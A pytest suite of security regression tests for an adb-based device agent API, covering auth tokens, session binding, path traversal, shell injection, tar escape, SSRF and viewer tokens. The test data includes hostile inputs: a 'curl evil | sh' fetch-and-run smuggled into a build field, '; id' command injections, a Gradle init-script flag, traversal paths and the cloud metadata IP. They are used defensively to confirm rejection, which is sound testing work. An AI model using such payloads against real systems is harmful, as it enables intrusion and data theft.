"""Device agent (adb HTTP API on an EC2 host) security regressions: token required, constant-time comparison, session binding, host path boundary, build without shell injection, viewer token."""
import importlib
import os
import sys

import pytest
from fastapi.testclient import TestClient

ROOT = os.path.join(os.path.dirname(os.path.dirname(__file__)), "device_agent")


@pytest.fixture
def agent(monkeypatch, tmp_path):
    monkeypatch.setenv("DEVICE_AGENT_TOKEN", "tok-123")
    monkeypatch.setenv("DEVICE_AGENT_SESSION", "")
    monkeypatch.setenv("ADB_SERIAL", "10.0.0.2:5555,10.0.0.3:5555")   # two devices without a docker socket
    monkeypatch.setenv("HOST_WORK", str(tmp_path))
    sys.path.insert(0, ROOT)
    sys.modules.pop("app", None)
    mod = importlib.import_module("app")
    calls = []

    def fake_run(cmd, **kw):
        calls.append(cmd)
        class P:  # noqa: D401
            returncode = 0; stdout = b"1\n" if b"getprop" in b" ".join(c.encode() if isinstance(c, str) else c for c in cmd) else b"Success\n"; stderr = b""
        return P()

    monkeypatch.setattr(mod.subprocess, "run", fake_run)
    mod.calls = calls
    yield mod
    sys.path.remove(ROOT)


def _h(sess=None):
    h = {"authorization": "Bearer tok-123"}
    if sess:
        h["x-cwe-session"] = sess
    return h


def test_refuses_to_start_without_token(monkeypatch):
    monkeypatch.delenv("DEVICE_AGENT_TOKEN", raising=False)
    sys.path.insert(0, ROOT); sys.modules.pop("app", None)
    try:
        with pytest.raises(SystemExit):
            importlib.import_module("app")
    finally:
        sys.modules.pop("app", None); sys.path.remove(ROOT)


def test_auth_and_session_binding(agent):
    c = TestClient(agent.app)
    assert c.get("/healthz").status_code == 200                                   # liveness only, unauthenticated
    assert c.get("/health").status_code == 401                                    # device information requires auth
    assert c.get("/health", headers={"authorization": "Bearer wrong"}).status_code == 401
    assert c.get("/health", headers=_h()).json()["booted"] is True
    assert c.post("/bind", json={"session_id": "sess_a"}, headers=_h()).json() == {"bound": "sess_a"}
    assert c.post("/bind", json={"session_id": "sess_b"}, headers=_h("sess_a")).status_code == 409   # once only
    assert c.get("/health", headers=_h()).status_code == 403                      # session header now required
    assert c.get("/health", headers=_h("sess_b")).status_code == 403
    assert c.get("/health", headers=_h("sess_a")).status_code == 200


def test_device_index_is_per_request(agent):
    c = TestClient(agent.app)
    c.post("/tap?device=1", json={"x": 1, "y": 2}, headers=_h())
    c.post("/tap?device=0", json={"x": 1, "y": 2}, headers=_h())
    serials = [cmd[2] for cmd in agent.calls if cmd[:2] == ["adb", "-s"]]
    assert serials[-2:] == ["10.0.0.3:5555", "10.0.0.2:5555"]
    assert c.post("/tap?device=9", json={"x": 1, "y": 2}, headers=_h()).status_code == 503


def test_build_rejects_traversal_and_shell_metacharacters(agent, monkeypatch):
    c = TestClient(agent.app)
    bad = c.post("/build", json={"source_url": "https://x/y.tgz", "build_id": "../../etc"}, headers=_h())
    assert bad.status_code == 400 and "build_id" in bad.text
    bad = c.post("/build", json={"source_url": "https://x/y.tgz", "tasks": "assembleDebug; curl evil | sh"}, headers=_h())
    assert bad.status_code == 400 and "tasks" in bad.text
    assert c.post("/build", json={"source_url": "http://x/y.tgz"}, headers=_h()).status_code == 400   # https only
    assert c.post("/build", json={"source_url": "file:///etc/passwd"}, headers=_h()).status_code == 400

    # happy path: fake out download/extract/container run and check the argv shape
    seen = {}
    monkeypatch.setattr(agent, "_download", lambda url, dst: open(dst, "wb").write(b"") or 0)
    monkeypatch.setattr(agent, "_safe_extract", lambda src, work: None)

    def fake_docker_run(image, cmd, binds, workdir, env, timeout):
        seen.update(cmd=cmd, binds=binds); return 0, "BUILD OK"
    monkeypatch.setattr(agent, "docker_run", fake_docker_run)
    r = c.post("/build", json={"source_url": "https://x/y.tgz", "build_id": "b1", "tasks": "assembleDebug assembleDebugAndroidTest"}, headers=_h()).json()
    assert r["build_id"] == "b1" and seen["cmd"][-2:] == ["assembleDebug", "assembleDebugAndroidTest"] and '"$@"' in seen["cmd"][2]
    assert seen["binds"][0].startswith(agent.BUILDS_DIR + "/b1:") and len(seen["binds"]) == 2


def test_safe_extract_rejects_escaping_members(agent, tmp_path):
    import io, tarfile

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        info = tarfile.TarInfo("../../evil.txt"); data = b"x"; info.size = len(data); t.addfile(info, io.BytesIO(data))
    src = tmp_path / "src.tgz"; src.write_bytes(buf.getvalue())
    work = tmp_path / "work"; work.mkdir()
    with pytest.raises(Exception):
        agent._safe_extract(str(src), str(work))
    assert not (tmp_path / "evil.txt").exists()


def test_install_path_must_be_under_builds(agent, tmp_path):
    c = TestClient(agent.app)
    assert c.post("/install", json={"path": "/etc/passwd"}, headers=_h()).status_code == 400
    assert c.post("/install", json={"url": "http://x/a.apk"}, headers=_h()).status_code == 400
    apk = tmp_path / "builds" / "b1" / "app.apk"; apk.parent.mkdir(parents=True); apk.write_bytes(b"apk")
    assert c.post("/install", json={"path": str(apk)}, headers=_h()).json()["ok"] is True


def test_logcat_grep_is_bounded(agent):
    c = TestClient(agent.app)
    assert c.get("/logcat", params={"grep": "(" }, headers=_h()).status_code == 400
    assert c.get("/logcat", params={"grep": "a" * 300}, headers=_h()).status_code == 400


def test_viewer_token_exchange_never_exposes_master_token(agent):
    c = TestClient(agent.app)
    assert c.get("/view").status_code == 401
    assert c.get("/view", params={"token": "tok-123"}).status_code == 401           # the query token is no longer accepted
    vt = c.post("/view/session", headers=_h()).json()["viewer_token"]
    r = c.get("/view", params={"vt": vt, "device": 1}, follow_redirects=False)
    assert r.status_code == 303 and "cwe_view" in r.headers["set-cookie"] and "HttpOnly" in r.headers["set-cookie"]
    assert c.get("/view", params={"vt": vt}).status_code == 401                        # single-use
    page = c.get("/view?device=1")                                                     # opened via cookie
    assert page.status_code == 200 and "tok-123" not in page.text and "device=1" in page.text
    assert c.post("/tap?device=1", json={"x": 1, "y": 1}).status_code == 200            # cookie allowed only on viewer paths
    assert c.post("/shell", json={"cmd": "id"}).status_code == 401


def test_sidecar_build_does_not_use_docker_or_send_token(agent, monkeypatch):
    import io, json

    monkeypatch.setattr(agent, "BUILD_BACKEND", "sidecar")
    monkeypatch.setattr(agent, "_download", lambda url, dst: open(dst, "wb").write(b""))
    monkeypatch.setattr(agent, "_safe_extract", lambda *a: None)
    def no_docker(*a, **kw):
        raise AssertionError("EKS must not access Docker")
    monkeypatch.setattr(agent, "docker_run", no_docker)
    monkeypatch.setattr(agent, "BUILD_SIDECAR_TOKEN", "builder-secret")

    def request(req, timeout):
        assert req.full_url == "http://127.0.0.1:9090/build"
        assert "tok-123" not in req.data.decode()                       # never the device token
        assert req.headers["Authorization"] == "Bearer builder-secret"  # pod loopback is not a trust boundary
        assert json.loads(req.data)["tasks"] == ["assembleDebug"]
        return io.BytesIO(json.dumps({"exit_code": 0, "log_tail": "BUILD OK"}).encode())
    monkeypatch.setattr(agent.urllib.request, "urlopen", request)
    response = TestClient(agent.app).post("/build", json={
        "source_url": "https://example.test/src.tgz", "build_id": "b1", "tasks": "assembleDebug"
    }, headers=_h())
    assert response.status_code == 200 and response.json()["log_tail"] == "BUILD OK"


def test_build_rejects_gradle_flags_disguised_as_tasks(agent):
    c = TestClient(agent.app)
    for tasks in ("--init-script /tmp/evil.gradle", "-Pfoo=bar assembleDebug", "assembleDebug --offline"):
        r = c.post("/build", json={"source_url": "https://example.test/s.tgz", "tasks": tasks}, headers=_h())
        assert r.status_code == 400 and "tasks" in r.text


def test_viewer_cookie_cannot_inject_a_device_shell_command(agent):
    """The viewer tier is human interaction only: /text must not become a second device command."""
    c = TestClient(agent.app)
    vt = c.post("/view/session", headers=_h()).json()["viewer_token"]
    c.get("/view", params={"vt": vt}, follow_redirects=False)
    assert c.post("/text", json={"text": "a; id"}).status_code == 200
    sent = [cmd for cmd in agent.calls if "input" in cmd and "text" in cmd][-1]
    assert sent[-1] == "'a;%sid'"                       # quoted for the device shell
    assert c.post("/key", json={"keycode": "KEYCODE_BACK"}).status_code == 200
    assert c.post("/key", json={"keycode": "66; id"}).status_code == 422
    assert c.post("/shell", json={"cmd": "id"}).status_code == 401


def test_download_rejects_private_and_redirected_targets(agent, monkeypatch):
    with pytest.raises(Exception) as e:
        agent._check_public_https("http://example.test/a.tgz")
    assert "https" in str(e.value)
    monkeypatch.setattr(agent.socket, "getaddrinfo",
                        lambda *a, **kw: [(2, 1, 6, "", ("169.254.169.254", 443))])
    with pytest.raises(Exception) as e:
        agent._check_public_https("https://metadata.example.test/a.tgz")
    assert "non-public" in str(e.value)


def test_builder_sidecar_requires_its_own_token():
    import importlib.util
    from pathlib import Path

    path = Path(__file__).resolve().parents[1] / "device_agent/builder.py"
    spec = importlib.util.spec_from_file_location("cwe_test_builder_auth", path)
    mod = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod)
    mod.TOKEN = "builder-secret"
    assert not mod.authorized({})                                  # the emulator container shares this loopback
    assert not mod.authorized({"Authorization": "Bearer wrong"})
    assert mod.authorized({"Authorization": "Bearer builder-secret"})
    mod.TOKEN = ""
    assert not mod.authorized({"Authorization": "Bearer "})         # unset token never authorizes
